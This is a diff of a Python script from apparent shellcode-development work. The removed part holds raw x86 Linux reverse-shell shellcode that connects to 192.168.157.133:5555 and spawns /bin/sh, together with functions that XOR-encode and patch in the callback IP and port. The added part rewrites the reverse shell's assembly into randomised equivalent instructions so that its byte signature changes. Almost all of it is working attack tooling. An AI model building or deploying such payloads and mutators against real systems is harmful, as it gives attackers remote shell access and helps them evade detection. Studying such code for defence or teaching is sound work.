@@ -1,96 +1,79 @@
 import socket
+import random
 
 
-code = ""
-code += "\\x89\\xe5\\x31\\xc0\\x31\\xc9\\x31\\xd2"
-code += "\\x50\\x50\\xb8\\xff\\xff\\xff\\xff\\xbb"
-code += "\\x80\\xff\\xff\\xfe\\x31\\xc3\\x53\\x66"
-code += "\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xc0"
-code += "\\x31\\xdb\\x66\\xb8\\x67\\x01\\xb3\\x02"
-code += "\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8"
-code += "\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2"
-code += "\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0"
-code += "\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6"
-code += "\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f"
-code += "\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89"
-code += "\\xe3\\xb0\\x0b\\xcd\\x80"
+def search_string_in_file(file_name, string_to_search):
+    """Search for the given string in file and return lines containing that string,
+    along with line numbers"""
+    line_number = 0
+    list_of_results = []
+    # Open the file in read only mode
+    with open(file_name, 'r') as read_obj:
+        # Read all lines in the file one by one
+        for line in read_obj:
+            # For each line, check if line contains the string
+            line_number += 1
+            if string_to_search in line:
+                # If yes, then add the line number & line as a tuple in the list
+                list_of_results.append((line_number, line.rstrip()))
+    # Return list of tuples containing line numbers and lines where string is found
+    return list_of_results
 
-ip = socket.inet_aton("192.168.157.133")
-
-
-def portInsert(code):
-    port = hex(socket.htons(int("5555")))
-    code = code.replace("\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{b1}\\x{b2}".format(
-        b1=port[4:6],
-        b2=port[2:4]
-    ))
-    return code
-
-def ipInsert(ip, code, xor_byte):
-    # Inject the IP address
-    ip_bytes = []
-    for i in range(0, 4):
-        ip_bytes.append(hex(ip[i] ^ xor_byte))
-    array_hex_ip = []
-    for i in range(0, 4):
-        if(len(ip_bytes[i][2:]) == 1):
-            hex_ip_bytes = ip_bytes[i][1:2]+"0"+ip_bytes[i][2]
-            array_hex_ip.append(hex_ip_bytes)
-        else:
-            array_hex_ip.append(ip_bytes[i][1:])
-    code = code.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\{b1}\\{b2}\\{b3}\\{b4}".format(
-        b1=array_hex_ip[0],
-        b2=array_hex_ip[1],
-        b3=array_hex_ip[2],
-        b4=array_hex_ip[3]
-    ))
-    return code
+# print(search_string_in_file("asm/fnl_reverse_shell_copy.asm","xor"))
 
 
-def xorFinder(ip):
-    xor_byte = 0
-    for i in range(1, 256):
-        matched_a_byte = False
-        #print(" ------------- i  :"+str(i))
-        for octet in ip:
-            #print(str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
-            if i == octet:
-                #print("dans if : "+str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
-                matched_a_byte = True
-                break
+def check():
+    with open('asm/fnl_reverse_shell_copy.asm') as f:
+        datafile = f.readlines()
 
-        if not matched_a_byte:
-            #print("dans if : "+str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
-            xor_byte = i
-            break
+    with open("asm/test.asm", "w") as file:
+        for line in datafile:
+            test = line.split()
+            if "xor" in line:
+                # found = True # Not necessary
+                # return True
+                if(test[1][:-1] == test[2]):
+                    if(random.randint(0, 1)):
+                        file.write("and " + test[2] + ", " + str("0x01010101") +
+                                   "\nand " + test[2] + ", " + str("0x02020202")+"\n")
+                    else:
+                        file.write("sub " + test[2] + ", " + test[2]+"\n")
+                else:
+                    file.write("xor " + test[1][:-1] + ", " + test[2]+"\n")
+            elif "mov" in line:
+                if(test[1][:-1] in set(["al", "bl", "cl", "dl", "ax", "eax", "edx", "ecx", "ebx", "esp", "ebp", "esp"])):
+                    if(test[2] not in set(["al", "bl", "cl", "dl","ax" "eax", "edx", "ecx", "ebx", "esp", "ebp", "esp"]) and test[2][0:2] == "0x"):
+                        if(not ((len(test[2]) == 10 and test[2] == "0xffffffff") or (len(test[2]) == 6 and test[2] == "0xffff") or (len(test[2]) == 4 and test[2] == "0xff"))):
+                            value = hex(int(test[2], 16)+1)
+                            if(len(value) == 3):
+                                value = "0x0"+value[2]
+                            print(value[0:len(value)])
+                            file.write("mov "+ test[1][:-1] + ", "+value+"\n dec "+ test[1][:-1]+"\n")
+                        else:
+                            print(line)
+                            value = hex(int(test[2], 16)-1)
+                            if(len(value) == 3):
+                                value = "0x0"+value[2]
+                            print(value[0:len(value)])
+                            file.write("mov "+ test[1][:-1] + ", "+value+"\n inc "+ test[1][:-1]+"\n")
+#return "mov " + val1 + ", 2\ndec " + val1
+#if num == 2:
+#return "mov " + val1 + ", 1h\ninc " + val1
+                    else:
+                        file.write("mov " + test[1][:-1] + ", " + test[2]+"\n")
 
-    # print(xor_byte)
-    if xor_byte == 0:
-        print("Failed to find a valid XOR byte")
-        exit(1)
-    return xor_byte
+            else:
+                file.write(line)
 
 
-def xorInsert(ip, code):
-    print("wouaw")
-    print(code)
-    xor_byte = xorFinder(ip)
-    # Inject the XOR bytes
-    if(len(hex(xor_byte)[2:]) == 1):
-        hex_xor_byte = hex(xor_byte)[1:2]+"0"+hex(xor_byte)[2]
-        print("hex_xor_byte : "+hex_xor_byte)
-        code = code.replace("\\xb8\\xff\\xff\\xff\\xff",
-                            "\\xb8\{x}\{x}\{x}\{x}".format(x=hex_xor_byte))
-    else:
-        code = code.replace("\\xb8\\xff\\xff\\xff\\xff",
-                            "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x=hex(xor_byte)[1:3]))
-        print("xor_byte : "+xor_byte)
-        print("hex(xor_byte)[1:3] : "+hex(xor_byte)[1:3])
-
-    code = ipInsert(ip, code, xor_byte)
-    return portInsert(code)
-
-code="\\x89\\xe5\\x31\\xc0\\x31\\xc9\\x31\\xd2\\x50\\x50\\xbf\\x80\\xff\\xff\\xfe\\x83\\xf7\\xff\\x57\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xc0\\x31\\xdb\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"
-test=xorInsert(ip,code)
-print("oui")
-print(test)
+check()
+# input file
+#fin = open("asm/fnl_reverse_shell_copy.asm", "rt")
+# data=fin.readlines()
+# for i in data:
+#    if(i.find("   xor")==0):
+#        print("OUI")
+#    print(i)
+#
+# close input and output files
+# fin.close()
